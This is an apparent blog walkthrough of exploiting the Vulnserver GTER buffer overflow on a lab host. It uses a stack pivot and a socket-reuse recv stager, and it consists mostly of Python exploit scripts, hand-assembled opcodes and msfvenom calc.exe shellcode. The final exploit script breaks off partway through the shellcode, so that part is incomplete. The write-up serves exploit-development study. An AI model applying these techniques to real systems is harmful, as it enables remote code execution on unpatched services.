---
title: "Vulnserver GTER - Staged exploitation and Socket reusing"
classes: wide
tag: 
  - "windows exploitation"
  - "vulnserver"
header:
  teaser: /assets/images/win-exp/windows-exp.png
ribbon: blue
description: "A simple walkthrough on  Vulnserver GTER using socket reusing and staged exploitation technique"
categories: ['Exploit-Development','Windows-Exploitation','Vulnserver']
---

- [Vulnserver GTER - Stack pivoting & Socket Reuse](#vulnserver-gter---stack-pivoting--socket-reuse)
  - [Prologue](#prologue)
  - [Stack pivoting](#stack-pivoting)
  - [Sockets](#sockets)
  - [Socket reusage shellcode](#socket-reusage-shellcode)
  - [Analysing socket calls](#analysing-socket-calls)
  - [Crafting file descriptor](#crafting-file-descriptor)
  - [Stack adjustment](#stack-adjustment)
  - [Crafting flag argument](#crafting-flag-argument)
  - [Crafting buffer size argument](#crafting-buffer-size-argument)
  - [Crafting buffer pointer](#crafting-buffer-pointer)
  - [Finalising the socket reuse stager](#finalising-the-socket-reuse-stager)
  - [Crafting shellcode](#crafting-shellcode)
  - [Exploitation](#exploitation)

## Prologue

In last post, we would have exploited the ```GTER``` command using stack pivots and egg hunters to perform a staged exploit

But in this post, we will be performing a staged exploit on the same GTER command along with stack pivots and ```socket reusage shellcode```

## Stack pivoting

We would have discussed about this on our previous post

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat stack-pivot.py 
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*151
# to overwrite EIP with JMP ESP
payload+=b"\xaf\x11\x50\x62"
# stack pivot
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 stack-pivot.py 
```

And the python script used for stack pivoting will be used for this exploit too

## Sockets

Windows Sockets 2 (Winsock) enables programmers to create advanced Internet, intranet, and other network-capable applications to transmit application data across the wire, independent of the network protocol being used

For more on [WinSock2](https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-start-page-2)


For more [API calls](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/) on WinSock2

## Socket reusage shellcode

There are many exploitation techniques that can be performed with ```socket reuse stager shellcode```

It depends on how the vulnerable program is using the socket

In the below diagram, we can see the socket calls between a client-server application to transfer a data between them

<div align="center">
<img src="https://rastating.github.io/assets/images/2019-06-21-using-socket-reuse-to-exploit-vulnserver/TCPsockets.jpg" style="width:50%">
</div>

Here the main socket call used to transfer data are ```send()``` and ```recv()```

We want the program to use our stager shellcode (in this scenario), so it is best to make the vulnerable program to receive the data

So for this case, we should focus on reusing our socket call with ```recv()``` 

While reusing the socket ```recv()``` there are two possibilities

- ```Create a new socket``` (Mostly it will be inefficient, because opening new socket connection on new port requires special privilege, sometimes it may even get blocked by firewall or get detected by blue team defenders)
- ```Reuse the existing socket connection``` (The best and efficient way, minimal usage of stager shellcode)

This [blog](https://fluidattacks.com/blog/vulnserver-gter-no-egghunter/) is an interesting one, where the author used different socket reuse exploit method for this command

The arguments required for ```recv()``` in socket is,

```c
// C++
int WSAAPI recv(
  [in]  SOCKET s, //socket file descriptor
  [out] char   *buf, //buffer pointer
  [in]  int    len, //buffer size
  [in]  int    flags //flag
);
```

We will be crafting these arguments to make ```recv()``` call in this exploit

For detailed information on [WinSock2's recv() API call](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv)

For more information on [Socket Reusage Shellcode](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-chong.pdf)


## Analysing socket calls

Lets view the memory map of the process in our debugger

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-memorymap.png">
</div>

Lets analyse the ```.text``` segment which contains the ```code``` being used by the Vulnserver in diassembled instructions

Scrolling through the instructions we would find ```CALL <JMP.&WS2_32.getaddrinfo>``` and ```CALL <JMP.&WS2_32.WSACleanup>``` and similar calls related to sockets

But, we need to focus on ```JMP.&WS2_32.recv()``` since this application initializes socket to receive data into the buffer

After scrolling through lots of instrcutions,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-socket-recv.png">
</div>

Viewing it on our CPU window and setting breakpoint on the ```CALL <JMP.&WS2_32.recv>``` instruction to analyse it further

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-recv-cpu.png">
</div>

After setting breakpoint, lets run the ```stack-pivot.py``` to connect through the socket

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-recv-bp.png">
</div>

We are storing the required values for ```socket``` in ESP

Lets step into the break point and make the ```call recv()``` work, so that we can see where it will be returned

*This screenshot is from another runtime, above screenshot was took previous day, kindly ignore the address and value changes*

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-recv-socket.png">
</div>

Here we could see the ```return address```, ```socket file descriptor```, ```buffer pointer```, ```buffer size``` and ```flags``` for the socket connection being used

These values will not be static, they will change for each call

- ```0x00401958``` is the return address, which will be executed after ```recv()``` gets completed

- ```124``` is the value of ```socket file descriptor``` used for this iteration 

- ```0x006333d8``` is the pointer address of the buffer where the input data from ```recv()``` is being stored

- ```0x1000``` (4096 bytes) is the ```size of the buffer``` to store the data

- ```0``` is set for ```flags``` which is default

If we execute till ```RET``` of the ```recv()``` iteration, we would reach here

It was mentioned on the top of ESP, where the control will be returned

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-recv-ret.png">
</div>

In order to make a perfect ```socket reuse stager```, we should place the arguments needed for the ```JMP.&WS2_32.recv``` function on the stack in the same order and call the function to use it

## Crafting file descriptor

Since, the file descriptor is the first parameter of sokcet ```recv()``` it will be loaded into the registers at last so that the operations performed on ESP registers can be minimized

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-1.png">
</div>

At last before the ```JMP.&WS2_32.recv``` call, you can see the value of the file descriptor being stored into EAX

```c
mov eax, dword ptr ss:[ebp-420]
mov dword ptr ss:[esp], eax
```

Here the actual value of file descriptor is stored on ```ebp-420``` which is being stored into ```eax``` and later being placed on top of the stack by ```esp``` 

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-2.png">
</div>

Here we can see the value stored in EAX is stored on top of ESP

While crafting our shellcode for reusing sockets, we cannot use absolute address of the socket parameters because it will change for each call

So it is best to handle it with ```ESP``` and other registers dynamically

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-3.png">
</div>

The absolute address of ```ebp-420``` is ```0x00ecfb50``` where our value for file descriptor ```124``` is present in it

Our value of ```ESP``` is ```0x00ecf9c8```

The difference in offsets between these addresses are,

```c
>>> 0xecfb50 - 0xecf9c8
392
>>> hex(0xecfb50 - 0xecf9c8)
'0x188'
```

We can use this offset difference to dynamically load the value of file descriptor which will be stored on ```ESP+0x188```, at the moment when our ```stage 1 payload``` gets hit

Lets analyse it with our python script to check the memory when our data gets received into it

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat stack-pivot.py 
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"\x90"*100
payload+=b"\xcc" #placing breakpoint 
payload+=b"\x90"*50
# to overwrite EIP with JMP ESP
payload+=b"\xaf\x11\x50\x62"
# stack pivot
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 stack-pivot.py
```

While running this, we will be performing the ```jump shellcode (stage1)``` and we will be returned to the buffer data

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-4.png">
</div>

Here in the memory dump, we can see the value of file descriptor on ```ESP+0x188```

So we can access this value at the runtime of our payload

Its time to craft the opcodes to get the file descriptor value

First we need to push the stack value and we should not perform any operations on ```ESP``` which may lead us to the wrong addresses

```c
push esp
```

After pushing the ```ESP``` we need that value to store in some register to perform arithmetic operations to reach ```ESP+0x188```

```c
pop ebx
add ebx,0x188
```

Generating opcodes using ```metasploit```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ /usr/bin/msf-nasm_shell
nasm > push esp
00000000  54                push esp
nasm > pop ebx
00000000  5B                pop ebx
nasm > add ebx,0x188
00000000  81C388010000      add ebx,0x188
// To avoid null bytes add on BX
nasm > add bx,0x188
00000000  6681C38801        add bx,0x188
nasm > 
```

Modifying the script to test the ```EBX``` register has the address value of ```file descriptor```,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat file-descriptor.py 
import socket, sys

file_descriptor=b""
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

payload=b""
payload+=b"\x90"*20
payload+=file_descriptor
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 file-descriptor.py
```

After hitting our breakpoint and scrolling up, we can see our opcode instruction and the value of ```EBX``` is same as the address of file descriptor

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-5.png">
</div>

## Stack adjustment

To craft our socket reuse stager, we need to perform many stack operations and to support that our ```ESP``` should be in an optimal address to perform it

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat file-descriptor.py 
import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

file_descriptor+=b"\x54" # adding PUSH ESP
file_descriptor+=b"\x54" # adding PUSH ESP

payload=b""
payload+=b"\x90"*20
payload+=file_descriptor
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 file-descriptor.py
```

Adding two ```push esp``` instructions to check ```ESP``` value

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-6.png">
</div>

Here we can see that the ESP value is decreasing for each push instruction which is not good, because at one point we will be overwriting our payload and EIP

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-7.png">
</div>

To avoid this, lets ```manually decrease the ESP value``` for better usage

Generating opcodes for that,

```c
nasm > sub esp, 0x70
00000000  83EC70            sub esp,byte +0x70
```

Lets test this now,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat esp-adjustment.py    
import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

payload=b""
payload+=b"\x90"*20
payload+=file_descriptor
payload+=stack_adjustment
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 esp-adjustment.py  
```

After running this, we can see that our ESP is far way from the EIP and we can use this to run other operations to perform socket reusing

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-fd-8.png">
</div>

Our ```JMP.&WS2_32.recv``` needs values of file descriptor, buffer pointer, buffer size and flag values to work

We will push it in reverse order so that we can load it properly into ```JMP.&WS2_32.recv```

## Crafting flag argument

The default value of flag in ```JMP.&WS2_32.recv``` is ```0```

We will be using the same value and push it into the stack

To store 0 in ```EAX``` lets use ```XOR``` function

If we perform other operations to store 0, it may give ```null bytes```, so it is better to uses XOR for these kind of logic


```c
XOR (a,a) = 0
```

Lets generate opcodes for that,

```c
nasm > xor eax,eax
00000000  31C0              xor eax,eax
nasm > push eax
00000000  50                push eax
```

Adding it into our python script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat flag-value.py     
import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

flag_value=b""
flag_value+=b"\x31\xc0"
flag_value+=b"\x50"

payload=b""
payload+=b"\x90"*20
payload+=file_descriptor
payload+=stack_adjustment
payload+=flag_value
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 flag-value.py     
```

After running this, we are able to set ```EAX``` as 0 and push it to the stack

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-flag-1.png">
</div>

Our first argument got pushed into stack

## Crafting buffer size argument

Now, we have pushed our ```flag``` argument into stack

Next to it, we have to push the ```buffer size``` for the socket

At starting we saw that tha buffer size being used by the socket was ```4096 bytes```

But we will use ```1024 bytes``` which is adequate for our final ```stage2 shellcode```

Hex value of ```1024 bytes``` is,

```c
>>> hex(1024)
'0x400'
```

Previously we have XORed ```EAX``` so its value will be 0

Crafting opcodes for pushing buffer size into stack,

```c
nasm > add eax,0x400
00000000  0500040000        add eax,0x400
// to avoid null bytes, adding on higher accumulator AX=AH+AL=0x4+0x00=0x400
nasm > add ah,0x4
00000000  80C404            add ah,0x4
nasm > push eax
00000000  50                push eax
```

Adding it to our python script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat buffer-size.py    
import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

flag_value=b""
flag_value+=b"\x31\xc0"
flag_value+=b"\x50"

buffer_size=b""
buffer_size+=b"\x80\xc4\x04"
buffer_size+=b"\x50"

payload=b""
payload+=b"\x90"*40
payload+=file_descriptor
payload+=stack_adjustment
payload+=flag_value
payload+=buffer_size
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 buffer-size.py
```

After running this script, we can see our buffer size ```0x400``` and flag value ```0x0``` stored in stack

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-buffsize-1.png">
</div>

We have pushed our second argument inside the stack too

## Crafting buffer pointer

From [Rasta's blog](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/), he had mentioned about two ways to store payload into a buffer and use that buffer pointer

- Calculate an address, push it on to the stack and then retrieve it after recv returns and jmp to that address
- Tell recv to just dump the received data directly ahead of where we are currently executing, allowing for execution to drop straight into it

Here, the second method is more easier and efficient to execute our payload

When we jump to the start of the buffer after ```jmp esp``` and ```long jump``` opcodes, it is already used and served its purpose

We dont need that anymore

What we can do is point our ```buffer pointer``` address in the upcoming address of our current buffer and push it to the stack to load our payload, which will be executed with NOP sled

Lets use this address as our buffer pointer and use it to save buffer data of ```1024 bytes``` from here

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-bp-1.png">
</div>

Calculating the offset between this address and ESP to push the address in stack, because it changes dynamically for each call

```c
>>> 0xeaf9c0 - 0xeaf950
112
>>> hex(112)
'0x70'
```

Generating opcodes to store this address as our buffer pointer agument and push it to stack

```c
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > add eax,0x70
00000000  83C070            add eax,byte +0x70
nasm > push eax
00000000  50                push eax
```

Adding it to our python script,

```c                                                                     
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat buffer-pointer.py 
import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

flag_value=b""
flag_value+=b"\x31\xc0"
flag_value+=b"\x50"

buffer_size=b""
buffer_size+=b"\x80\xc4\x04"
buffer_size+=b"\x50"

buffer_pointer=b""
buffer_pointer+=b"\x54"
buffer_pointer+=b"\x58"
buffer_pointer+=b"\x83\xc0\x70"
buffer_pointer+=b"\x50"

payload=b""
payload+=b"\x90"*40
payload+=file_descriptor
payload+=stack_adjustment
payload+=flag_value
payload+=buffer_size
payload+=buffer_pointer
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 buffer-pointer.py
```

After running this, lets test it on our debugger

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-bp-2.png">
</div>

We can see that we have successfully placed the buffer pointer in top of the stack

Still one more pending, we have to push the file descriptor which we framed at the start

## Finalising the socket reuse stager

We have pushed our 3 arguments required for the socket ```JMP.&WS2_32.recv```

Still we need to push the ```socket file descriptor``` value to finalise the stager

Our file descriptor value (need to be dereferenced from the pointer present in EBX) is stored in the address present in ```EBX```

Generating opcodes to get the file descriptor value,

```c
nasm > mov ecx,[ebx]
00000000  8B0B              mov ecx,[ebx]
nasm > push ecx
00000000  51                push ecx
```

This is similar to ```push  dword ptr ds:[ebx]```

Adding this to our script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat socket-reuse-stager.py
import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

flag_value=b""
flag_value+=b"\x31\xc0"
flag_value+=b"\x50"

buffer_size=b""
buffer_size+=b"\x80\xc4\x04"
buffer_size+=b"\x50"

buffer_pointer=b""
buffer_pointer+=b"\x54"
buffer_pointer+=b"\x58"
buffer_pointer+=b"\x83\xc0\x70"
buffer_pointer+=b"\x50"

get_file_descriptor=b""
get_file_descriptor+=b"\x8b\x0b"
get_file_descriptor+=b"\x51"

payload=b""
payload+=b"\x90"*40
payload+=file_descriptor
payload+=stack_adjustment
payload+=flag_value
payload+=buffer_size
payload+=buffer_pointer
payload+=get_file_descriptor
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 socket-reuse-stager.py
```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-stager-1.png">
</div>

We can see that the ```JMP.&WS2_32.recv``` arguments are aligned perfectly as we expected

Now after framing these arguments, we need to call the ```JMP.&WS2_32.recv``` function to use this arguments

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-stager-2.png">
</div>

Our first ```CALL <JMP.&WS2_32.recv>``` is at ```0x401953```, but the function ```<JMP.&WS2_32.recv>``` is located at ```0x40252c```

We need to call this address to load the arguments to reuse the socket to receive data again

Generating opcodes to call this function,

```c
// leads to null bytes
nasm > mov edx,0x40252c
00000000  BA2C254000        mov edx,0x40252c
// adding padding value 
nasm > mov edx,0x40252caa
00000000  BAAA2C2540        mov edx,0x40252caa
// performing left shift operation to remove null bytes (1 byte = 8 bits)
// 0x40252caa ---> Shift 4 bits right = 0x040252ca
// 0x040252ca ---> Shift 4 bits right = 0x0040252c
nasm > shr edx,8
00000000  C1EA08            shr edx,byte 0x8
nasm > call edx
00000000  FFD2              call edx
```

Adding this to our python script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat socket-reuse-stager.py    
import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

flag_value=b""
flag_value+=b"\x31\xc0"
flag_value+=b"\x50"

buffer_size=b""
buffer_size+=b"\x80\xc4\x04"
buffer_size+=b"\x50"

buffer_pointer=b""
buffer_pointer+=b"\x54"
buffer_pointer+=b"\x58"
buffer_pointer+=b"\x83\xc0\x70"
buffer_pointer+=b"\x50"

get_file_descriptor=b""
get_file_descriptor+=b"\x8b\x0b"
get_file_descriptor+=b"\x51"

socket_recv=b""
socket_recv+=b"\xba\xaa\x2c\x25\x40"
socket_recv+=b"\xc1\xea\x08"
socket_recv+=b"\xff\xd2"

payload=b""
payload+=b"\x90"*40
payload+=file_descriptor
payload+=stack_adjustment
payload+=flag_value
payload+=buffer_size
payload+=buffer_pointer
payload+=get_file_descriptor
payload+=socket_recv
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 socket-reuse-stager.py
```

After running this, we could see that our ```call edx``` instruction is able to call the ```JMP.&WS2_32.recv``` function

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-stager-3.png">
</div>

Proceeding with step into, we can see that our arguments are loaded properly

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter2-stager-4.png">
</div>

As for now, we are able to call ```JMP.&WS2_32.recv``` along with the arguments aligned on stack perfectly

Its time to craft our second stager shellcode and use it for our exploit

## Crafting shellcode

Lets generate the shellcode to pop ```calc.exe``` using msfvenom,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$  msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f python        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1078 bytes
buf =  b""
buf += b"\xbd\x2d\xad\x09\x5a\xd9\xc7\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x31\x31\x6f\x13\x03\x6f\x13\x83\xc7\x29\x4f"
buf += b"\xfc\xa6\xd9\x0d\xff\x56\x19\x72\x89\xb2\x28\xb2\xed"
buf += b"\xb7\x1a\x02\x65\x95\x96\xe9\x2b\x0e\x2d\x9f\xe3\x21"
buf += b"\x86\x2a\xd2\x0c\x17\x06\x26\x0e\x9b\x55\x7b\xf0\xa2"
buf += b"\x95\x8e\xf1\xe3\xc8\x63\xa3\xbc\x87\xd6\x54\xc9\xd2"
buf += b"\xea\xdf\x81\xf3\x6a\x03\x51\xf5\x5b\x92\xea\xac\x7b"
buf += b"\x14\x3f\xc5\x35\x0e\x5c\xe0\x8c\xa5\x96\x9e\x0e\x6c"
buf += b"\xe7\x5f\xbc\x51\xc8\xad\xbc\x96\xee\x4d\xcb\xee\x0d"
buf += b"\xf3\xcc\x34\x6c\x2f\x58\xaf\xd6\xa4\xfa\x0b\xe7\x69"
buf += b"\x9c\xd8\xeb\xc6\xea\x87\xef\xd9\x3f\xbc\x0b\x51\xbe"
buf += b"\x13\x9a\x21\xe5\xb7\xc7\xf2\x84\xee\xad\x55\xb8\xf1"
buf += b"\x0e\x09\x1c\x79\xa2\x5e\x2d\x20\xa8\xa1\xa3\x5e\x9e"
buf += b"\xa2\xbb\x60\x8e\xca\x8a\xeb\x41\x8c\x12\x3e\x26\x62"
buf += b"\x59\x63\x0e\xeb\x04\xf1\x13\x76\xb7\x2f\x57\x8f\x34"
buf += b"\xda\x27\x74\x24\xaf\x22\x30\xe2\x43\x5e\x29\x87\x63"
buf += b"\xcd\x4a\x82\x07\x90\xd8\x4e\xe6\x37\x59\xf4\xf6"
```

This will be our ```second stager shellcode``` which will be passed into the buffer of ```1024 bytes``` requested from the ```socket reuse stager```

## Exploitation

The final exploit for the ```GTER``` command using ```socket reuse stager``` is,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat exploit.py    
import socket, sys
from time import sleep

file_descriptor=b""
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

flag_value=b""
flag_value+=b"\x31\xc0"
flag_value+=b"\x50"

buffer_size=b""
buffer_size+=b"\x80\xc4\x04"
buffer_size+=b"\x50"

buffer_pointer=b""
buffer_pointer+=b"\x54"
buffer_pointer+=b"\x58"
buffer_pointer+=b"\x83\xc0\x70"
buffer_pointer+=b"\x50"

get_file_descriptor=b""
get_file_descriptor+=b"\x8b\x0b"
get_file_descriptor+=b"\x51"

socket_recv=b""
socket_recv+=b"\xba\xaa\x2c\x25\x40"
socket_recv+=b"\xc1\xea\x08"
socket_recv+=b"\xff\xd2"

buf =  b""
buf += b"\xbd\x2d\xad\x09\x5a\xd9\xc7\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x31\x31\x6f\x13\x03\x6f\x13\x83\xc7\x29\x4f"
buf += b"\xfc\xa6\xd9\x0d\xff\x56\x19\x72\x89\xb2\x28\xb2\xed"
buf += b"\xb7\x1a\x02\x65\x95\x96\xe9\x2b\x0e\x2d\x9f\xe3\x21"
buf += b"\x86\x2a\xd2\x0c\x17\x06\x26\x0e\x9b\x55\x7b\xf0\xa2"
buf += b"\x95\x8e\xf1\xe3\xc8\x63\xa3\xbc\x87\xd6\x54\xc9\xd2"
buf += b"\xea\xdf\x81\xf3\x6a\x03\x51\xf5\x5b\x92\xea\xac\x7b"
buf += b"\x14\x3f\xc5\x35\x0e\x5c\xe0\x8c\xa5\x96\x9e\x0e\x6c"
buf += b"\xe7\x5f\xbc\x51\xc8\xad\xbc\x96\xee\x4d\xcb\xee\x0d"
buf += b"\xf3\xcc\x34\x6c\x2f\x58\xaf\xd6\xa4\xfa\x0b\xe7\x69"
buf += b"\x9c\xd8\xeb\xc6\xea\x87\xef\xd9\x3f\xbc\x0b\x51\xbe"
buf += b"\x13\x9a\x21\xe5\xb7\xc7\xf2\x84\xee\xad\x55\xb8\xf1"
buf += b"\x0e\x09\x1c\x79\xa2\x5e\x2d\x20\xa8\xa1\xa3\x5e\x9e"
buf += b"\xa2\xbb\x60\x8e\xca\x8a\xeb\x41\x8c\x12\x3e\x26\x62"
buf += b"\x59\x63\x0e\xeb\x04\xf1\x13\x76\xb7\x2f\x57\x8f\x34"
buf += b"\xda\x27\x74\x24\xaf\x22\x30\xe2\x43\x5e\x29\x87\x63"
